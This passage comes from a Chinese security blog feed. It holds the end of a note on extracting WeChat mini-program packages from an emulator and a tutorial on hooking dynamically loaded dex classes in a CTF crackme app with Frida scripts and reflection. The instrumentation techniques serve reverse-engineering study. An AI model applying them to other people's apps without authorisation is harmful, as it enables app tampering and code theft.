&lt;h1 id=&quot;获取小程序包&quot;&gt;&lt;a href=&quot;#获取小程序包&quot; class=&quot;headerlink&quot; title=&quot;获取小程序包&quot;&gt;&lt;/a&gt;获取小程序包&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1.使用自己手机上的微信打开对应的小程序,可以添加到&amp;quot;我的小程序&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2.打开模拟器的微信并登录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.在模拟器微信的下拉小程序最近使用历史中打开&amp;quot;你所选的小程序&amp;quot;,如果历史记录中没有就在我的小程序中找一找&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4.打开小程序等待加载之后就可以去找源码包了&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5.打开对应的文件管理器,进入到以下路径查找源码包(可以根据下载时间区分出你想要的源码包)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6.拷贝到mumu浏览器共享目录&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;小程序存放路径如下：/data/data/com.tencent.mm/MicroMsg/…/appbrand/pkg/&lt;/p&gt;
&lt;p&gt;…部分根据时间戳或者单点击一个小程序在进行测试，大部分为03075c115f972899a1b1b8cc70506599这种&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210913181136982.png&quot; alt=&quot;image-20210913181136982&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="小程序" scheme="http://www.ol4three.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>Frida--Android逆向之动态加载dex Hook(下)</title>
    <link href="http://www.ol4three.com/2021/08/13/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8B/"/>
    <id>http://www.ol4three.com/2021/08/13/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8B/</id>
    <published>2021-08-13T06:21:07.000Z</published>
    <updated>2021-12-21T10:31:06.479Z</updated>
    
    <content type="html"><![CDATA[<p>​    上篇主要是跟着师傅学习了Robust的原理，并以做题的思路去求解了这个示例ctf，其实这是一种思路的启示，当我们在不知道怎么hook动态加载的dex，jar时候，找找是否存在能够操作动态加载出来的类的方法。</p><p>​    这一篇我们一起来学习如何用Frida来hook DexclassLoader，如何用反射直接调用类的方法，达到跟hook一般类一样的效果。最终在虚拟机、测试机和frida中发现多种问题，之后更换测试机进行测试的时候仍然存在问题，留下了一部分搞不懂的地方，当个坑未，来找到解决问题在进行填补。</p><h1 id="文章涉及内容以及使用到的工具"><a href="#文章涉及内容以及使用到的工具" class="headerlink" title="文章涉及内容以及使用到的工具"></a><strong>文章涉及内容以及使用到的工具</strong></h1><h2 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADT（Android Developer Tools）</span><br><span class="line">Jadx-gui</span><br><span class="line">JEB</span><br><span class="line">frida</span><br><span class="line">apktool</span><br><span class="line">android源码包</span><br><span class="line">Nexus 6p（genymotion，实体机等亦可）</span><br></pre></td></tr></table></figure><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java 泛型</span><br><span class="line">Java 反射机制</span><br><span class="line">DexClassLoader 动态加载机制</span><br><span class="line">Frida 基本操作</span><br><span class="line">Frida 创建任意类型数组（Java.array）</span><br><span class="line">Frida 类型转换（Java.cast）</span><br><span class="line">Frida 方法重载（overload）</span><br><span class="line">Frida Spawn</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="代码分析与构造"><a href="#代码分析与构造" class="headerlink" title="代码分析与构造"></a>代码分析与构造</h1><h2 id="Frida-Spawn的使用"><a href="#Frida-Spawn的使用" class="headerlink" title="Frida Spawn的使用"></a>Frida Spawn的使用</h2><p>​    通过上篇Robust的原理学习和对app的分析，我们知道Robust的其实就是在正常的使用<code>DexClassLoader</code>去动态加载文件，随后通过<code>反射</code>的方式去调用类方法或成员变量。</p><p>​    同时在上篇文章中，我们也知道Robust调用DexClassLoader的类是在<code>PatchExecutor</code>中，而调用PatchExecutor类是在一个叫<code>runRobust</code>的方法中，这个方法就在<code>MainActivity</code>中，并且在<code>onCreate</code>方法中调用。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210813160714545.png" alt="image-20210813160714545"></p><p>现在我们明白了一点是，app动态加载dex的地方是在onCreate中，也就是说app一启动就执行了动态加载，并不是在我们点击按钮的时候。所以这个地方，我们要执行py脚本的话，需要在app执行onCreate方法之前。frida有一个功能可以为我们生成一个进程而不是将它注入到运行中的进程中，它注入到Zygote中，生成我们的进程并且等待输入。</p><p>我们可以通过<code>-f</code>参数选项来实现。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida -U -f cn.chaitin.geektan.crackme   &#x2F;&#x2F;app完整名</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ frida -U -f cn.chaitin.geektan.crackme                                                       1 ↵</span><br><span class="line">     ____</span><br><span class="line">    &#x2F; _  |   Frida 15.1.1 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   &#x2F;_&#x2F; |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#39;object&#39;</span><br><span class="line">   . . . .       exit&#x2F;quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https:&#x2F;&#x2F;frida.re&#x2F;docs&#x2F;home&#x2F;</span><br><span class="line">Spawned &#96;cn.chaitin.geektan.crackme&#96;. Use %resume to let the main thread start executing!</span><br><span class="line">[Android Emulator 5554::cn.chaitin.geektan.crackme]-&gt; %resume</span><br><span class="line">[Android Emulator 5554::cn.chaitin.geektan.crackme]-&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211108183528543.png" alt="image-20211108183528543"></p><p>运行一遍我们就可以从从上面可以看到，通过<code>-f</code>参数，frida会Spawned这个应用，在这个时候启动python脚本，再执行<code>%resume</code>命令,我们就可以在app执行onCreate方法前完成脚本的启动，这时候就能hook住onCreate中执行的一些方法。</p><h2 id="DexClassLoader-动态加载机制"><a href="#DexClassLoader-动态加载机制" class="headerlink" title="DexClassLoader 动态加载机制"></a>DexClassLoader 动态加载机制</h2><p>现在我们已经知道hook住onCreate中执行的方法了，现在我们就来试试，第一个目标是能获取到动态加载的dex中的类。在这直接我们来试一下直接去hook动态加载的类，会出现什么情况。</p><p>JS代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;test&quot;);</span><br><span class="line">        Java.use(&quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;);</span><br><span class="line">        console.log(&quot;test over&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import frida,sys</span><br><span class="line"> </span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;test&quot;);</span><br><span class="line">        Java.use(&quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;);</span><br><span class="line">        console.log(&quot;test over&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">session &#x3D; frida.get_usb_device().attach(&quot;cn.chaitin.geektan.crackme&quot;)</span><br><span class="line">script &#x3D; session.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;,on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>我们首先启动通过frida启动，然后运行我们的脚本，在oncreate方法未调用前，运行我们的脚本，在使用%resume启动APP</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.frida -U -f cn.chaitin.geektan.crackme</span><br><span class="line">2.python jscode.py</span><br><span class="line">3.%resume</span><br></pre></td></tr></table></figure><p>这里可以明显的看到输出了对应的错误信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test</span><br><span class="line">&#123;&#39;type&#39;: &#39;error&#39;, &#39;description&#39;: &#39;Error: java.lang.ClassNotFoundException: Didn\&#39;t find class &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot; on path: DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;x86, &#x2F;vendor&#x2F;lib, &#x2F;system&#x2F;lib]]&#39;, &#39;stack&#39;: &#39;Error: java.lang.ClassNotFoundException: Didn\&#39;t find class &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot; on path: DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;x86, &#x2F;vendor&#x2F;lib, &#x2F;system&#x2F;lib]]\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;env.js:124)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:443)\n    at value (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:812)\n    at _make (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:112)\n    at use (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:63)\n    at use (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:246)\n    at &lt;anonymous&gt; (&#x2F;script1.js:4)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;vm.js:16)\n    at _performPendingVmOps (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:238)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:230)\n    at apply (native)\n    at ne (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:613)\n    at &lt;anonymous&gt; (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:592)&#39;, &#39;fileName&#39;: &#39;frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;env.js&#39;, &#39;lineNumber&#39;: 124, &#39;columnNumber&#39;: 1&#125;</span><br></pre></td></tr></table></figure><p>果不其然，这样去直接hook类肯定是不行的，但我们知道只要是从外部资源文件中动态加载dex，一般都是采用DexClassLoader动态加载的。学习过Java的同学应该知道，DexClassLoader动态加载的主要方法就是<code>loadClass()</code>。我们从Java源码上去分析一下，这里给大家一个java开发文档的查看地址：<a href="https://www.androidos.net.cn/android/8.0.0_r4/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java">访问</a></p><p>我们看到DexClassLoader的构造函数有4个参数，这里没有loadClass()，我们继续查看它的父类BaseDexClassLoader。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class DexClassLoader extends BaseDexClassLoader &#123;</span><br><span class="line">    public DexClassLoader(String dexPath, String optimizedDirectory,</span><br><span class="line">            String librarySearchPath, ClassLoader parent) &#123;</span><br><span class="line">        super(dexPath, new File(optimizedDirectory), librarySearchPath, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样BaseDexClassLoader也没有loadClass()，最终在它的父类<code>ClassLoader</code>中找到了loadClass()方法。</p><p>可以看到DexClassLoader加载的逻辑其实就是ClassLoader中的loadClass()，它的机制简单的了解到这里，现在我们来试试，通过这样的方式能不能hook我们想要的类。</p><p>我们先hook DexClassLoader的构造函数，看看传递进的参数值是什么。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        &#x2F;&#x2F;创建一个DexClassLoader的wapper</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        &#x2F;&#x2F;hook 它的构造函数$init，我们将它的四个参数打印出来看看。</span><br><span class="line">        dexclassLoader.$init.implementation &#x3D; function(dexPath,optimizedDirectory,librarySearchPath,parent)&#123;</span><br><span class="line">             console.log(&quot;dexPath:&quot;+dexPath);</span><br><span class="line">            console.log(&quot;optimizedDirectory:&quot;+optimizedDirectory);</span><br><span class="line">             console.log(&quot;librarySearchPath:&quot;+librarySearchPath);</span><br><span class="line">            console.log(&quot;parent:&quot;+parent);</span><br><span class="line">            &#x2F;&#x2F;不破换它原本的逻辑，我们调用它原本的构造函数。</span><br><span class="line">          this.$init(dexPath,optimizedDirectory,librarySearchPath,parent);</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(&quot;down!&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行情况如下：</p><p>我们获取到了构造函数的参数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">down!</span><br><span class="line">dexPath:&#x2F;data&#x2F;user&#x2F;0&#x2F;cn.chaitin.geektan.crackme&#x2F;cache&#x2F;GeekTan&#x2F;patch_temp.jar</span><br><span class="line">optimizedDirectory:&#x2F;data&#x2F;user&#x2F;0&#x2F;cn.chaitin.geektan.crackme&#x2F;cache</span><br><span class="line">librarySearchPath:null</span><br><span class="line">parent:dalvik.system.PathClassLoader[DexPathList[[zip file &quot;&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;base.apk&quot;],nativeLibraryDirectories&#x3D;[&#x2F;data&#x2F;app&#x2F;cn.chaitin.geektan.crackme-1&#x2F;lib&#x2F;arm64, &#x2F;vendor&#x2F;lib64, &#x2F;system&#x2F;lib64]]]</span><br></pre></td></tr></table></figure><h2 id="Frida-方法重载（overload）"><a href="#Frida-方法重载（overload）" class="headerlink" title="Frida 方法重载（overload）"></a>Frida 方法重载（overload）</h2><p>我们来尝试获取一下动态加载的类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var hookClass &#x3D; undefined；</span><br><span class="line">        &#x2F;&#x2F;hook loadClass方法</span><br><span class="line">        dexclassLoader.loadClass.implementation &#x3D; function(name)&#123;</span><br><span class="line">        &#x2F;*因为loadClass可能会加载很多类，所以我们得定义个hookname变量，</span><br><span class="line">        这样有针对的获取我们想要的类*&#x2F;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            if(name &#x3D;&#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                hookClass &#x3D; result;</span><br><span class="line">                console.log(hookClass);</span><br><span class="line">                return result;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行看看结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;type&#39;: &#39;error&#39;, &#39;description&#39;: &quot;Error: loadClass(): has more than one overload, use</span><br><span class="line">.overload(&lt;signature&gt;) to choose from:.overload(&#39;java.lang.String&#39;)</span><br><span class="line">.overload(&#39;java.lang.String&#39;, &#39;boolean&#39;)&quot;....&#125;</span><br></pre></td></tr></table></figure><p>发现frida报错了，从报错信息我们可以发现loadClass()有2个重载方法，我们这里需要通过overload指定我们要HOOK的重载方法才行，如果不知道重载哪一个然后可以先让报错在进行操作</p><p>ClassLoader类中的两个loadClass重载方法</p><p>loadClass(String name)；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        return loadClass(name, false);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>loadClass(String name, boolean resolve)；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">        throws ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">            &#x2F;&#x2F; First, check if the class has already been loaded</span><br><span class="line">            Class&lt;?&gt; c &#x3D; findLoadedClass(name);</span><br><span class="line">            if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (parent !&#x3D; null) &#123;</span><br><span class="line">                        c &#x3D; parent.loadClass(name, false);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        c &#x3D; findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                    &#x2F;&#x2F; ClassNotFoundException thrown if class not found</span><br><span class="line">                    &#x2F;&#x2F; from the non-null parent class loader</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F; If still not found, then invoke findClass in order</span><br><span class="line">                    &#x2F;&#x2F; to find the class.</span><br><span class="line">                    c &#x3D; findClass(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return c;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到真正执行loadClass的方法是<code>loadClass(String name, boolean resolve)；</code>, 那么我们可以hook第一个，然后在其调用第二个重载方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  Java.perform(function()&#123;</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">           &#x2F;&#x2F;定义一个String变量，指定我们需要的类</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            &#x2F;&#x2F;直接调用第二个重载方法，跟原本的逻辑相同。</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            &#x2F;&#x2F;如果loadClass的name参数和我们想要hook的类名相同</span><br><span class="line">            if(name &#x3D;&#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                &#x2F;&#x2F;则拿到它的值</span><br><span class="line">                hookClass &#x3D; result;</span><br><span class="line">                &#x2F;&#x2F;打印hookClass变量的值</span><br><span class="line">                console.log(hookClass);</span><br><span class="line">                send(hookClass);</span><br><span class="line">                return result;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行情况：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class cn.chaitin.geektan.crackme.MainActivityPatch</span><br><span class="line">[*] &lt;instance: java.lang.Class&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们已经通过hook loadClass拿到了MainActivityPatch类</p><h2 id="Frida-类型转换（Java-cast）"><a href="#Frida-类型转换（Java-cast）" class="headerlink" title="Frida 类型转换（Java.cast）"></a>Frida 类型转换（Java.cast）</h2><p>这里我们是不能直接通过(.)运算符直接调用方法的，可以看到loadClass()返回类型的是一个泛型，其中？代表任何类型，因为loadClass(）也不知道要加载的类的类型，所以返回类型就采用<code>Class&lt;?&gt;</code>代表所有类型的类，所以最后返回的是一个类型为指向<code>MainActivityPatch</code>的Class对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)；</span><br></pre></td></tr></table></figure><p>理论是这样的，但实际上却不是，我们还需要进行类型转换。这里Frida提供的一个方法处理泛型的方法<code>Java.cast</code>。<br>构造代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var constructorclass &#x3D; Java.use(&quot;java.lang.reflect.Constructor&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                console.log(&quot;------------------------------CAST--------------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;类型转换</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                &#x2F;&#x2F;调用getMethods()获取类下的所有方法</span><br><span class="line">                var methods &#x3D; hookClassCast.getMethods();</span><br><span class="line">                console.log(methods);</span><br><span class="line">                console.log(&quot;-----------------------------NOT CAST-----------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;未进行类型转换，看看能否调用getMethods()方法</span><br><span class="line">                var methodtest &#x3D; hookClass.getMethods();</span><br><span class="line">                console.log(methodtest);</span><br><span class="line">                console.log(&quot;---------------------OVER------------------------&quot;)</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221120607031.png" alt="image-20211221120607031"></p><p>我们可以看到cast后才能调用getMethods(),没有cast则会报为定义不能调用的错误。</p><h2 id="Frida创建任意类型数组（Java-array）"><a href="#Frida创建任意类型数组（Java-array）" class="headerlink" title="Frida创建任意类型数组（Java.array）"></a>Frida创建任意类型数组（Java.array）</h2><p>现在我们得到了一个类型为<code>MainActivityPatch</code>的Class对象，我们接下来就来看看怎么调用<code>Joseph</code>方法。在这之前，你需要对反射的用法有一定的了解。至于怎么用，就针对实际情况选取你认为最好的办法就行了。<br>当然在我多次踩坑之后，比如：</p><ul><li>在Class的getMethod方法中，怎么用js构造<code>int.class</code>,<code>float.class</code>，以及构造Integer.TYPE数组出现莫名错误。</li><li>怎么利用Frida函数构造任意类型的数组。</li><li>无参构造函数调用newInstance()，跟有参构造函数调用newInstance()的问题。</li><li>….</li></ul><p>我认为还是有必要给大家提供一种<code>比较通用</code>的方法。<br>1.利用getDeclaredConstructor()获取具有指定参数列表构造函数的Constructor。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="line">     throws NoSuchMethodException, SecurityException &#123;</span><br><span class="line">     return getConstructor0(parameterTypes, Member.DECLARED);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>可以看到，参数是一个Class&lt;?&gt;…，也就是说这是一个[Ljava.lang.Object;类型的数组。我们现在要到MainActivity</p><p>Patch构造函数对象，从代码中可以知道参数是Object类型。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public MainActivityPatch(Object obj)&#123;</span><br><span class="line">this.orginClass &#x3D; (MainActivity) obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们如何构造并传入这个数组呢</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\\利用java.array的标准写法</span><br><span class="line">var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">var a &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line"> </span><br><span class="line">\\偷懒写法</span><br><span class="line">var a &#x3D; hookClassCast.getDeclaredConstructor([objectclass.class]);</span><br></pre></td></tr></table></figure><p>Java.array()的用法格式如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.array(&#39;type&#39;,[value1,value2,....]);</span><br></pre></td></tr></table></figure><p>支持什么type，大家可以参看<code>frida-java</code>的<a href="https://github.com/frida/frida-java">源码</a>。在<code>class-factory.js</code>中就可以找到了。基本类型如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Z -- boolean</span><br><span class="line">2. B -- byte</span><br><span class="line">3. C -- char</span><br><span class="line">4. S -- short</span><br><span class="line">5. I --  int</span><br><span class="line">6. J -- long</span><br><span class="line">7. F -- float</span><br><span class="line">8. D  -- double</span><br><span class="line">9. V -- void</span><br></pre></td></tr></table></figure><p>我们getDeclaredConstructor()得到了构造函数Constructor，我们现在要将它实例化，再来看看MainActivityPatch的构造函数，传递一个object对象，并将它强制转换成MainActivity类型。<br>那我们实例化的参数就是MainActivity对象了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivityPatch &#123;</span><br><span class="line">    MainActivity originClass;</span><br><span class="line">    &#x2F;&#x2F;构造函数</span><br><span class="line">    public MainActivityPatch(Object obj) &#123;</span><br><span class="line">        this.originClass &#x3D; (MainActivity) obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;patchAc:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">console.log(&quot;--------------------------------------------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Constructor:public 